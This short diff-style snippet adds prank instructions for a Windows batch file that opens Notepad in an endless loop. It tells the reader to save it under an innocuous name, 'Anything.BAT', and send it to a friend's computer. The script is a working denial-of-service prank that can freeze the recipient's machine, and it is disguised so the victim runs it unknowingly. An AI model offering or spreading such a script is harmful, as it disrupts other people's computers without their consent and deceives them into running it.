@@ -1,0 +1,9 @@
+Open Notepad continually in your friend’s computer:
+Type :
+
+@ECHO off
+:top
+START %SystemRoot%\system32\notepad.exe
+GOTO top
+
+Save it as “Anything.BAT” and send it.
